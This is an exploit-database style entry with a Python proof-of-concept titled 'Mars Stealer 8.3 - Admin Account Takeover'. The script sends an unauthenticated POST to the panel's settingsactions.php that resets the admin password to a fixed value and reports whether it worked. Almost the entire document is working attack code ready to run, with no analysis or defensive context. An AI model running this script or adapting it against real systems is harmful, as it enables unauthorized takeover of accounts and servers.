


Type: Admin Account Takeover

Author:  [Sköll](https://twitter.com/s_k_o_l_l)

```
# Exploit Title: Mars Stealer 8.3 - Admin Account Takeover
# Product: Mars Stelaer
# Technology: PHP
# Version: < 8.3
# Google Dork: N/A
# Date: 20.04.2023
# Tested on: Linux 
# Author: Sköll - twitter.com/s_k_o_l_l


import argparse
import requests

parser = argparse.ArgumentParser(description='Mars Stealer Account Takeover Exploit')
parser.add_argument('-u', '--url', required=True, help='Example: python3 exploit.py -u http://localhost/')
args = parser.parse_args()

url = args.url.rstrip('/') + '/includes/settingsactions.php'
headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Sköll", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": url, "Referer": url, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US;q=0.8,en;q=0.7"}
data = {"func": "savepwd", "pwd": "sköll"} #change password
response = requests.post(url, headers=headers, data=data)

if response.status_code == 200:
    print("Succesfull!")
    print("New Password: " + data["pwd"])
else:
	print("Exploit Failed!")
```

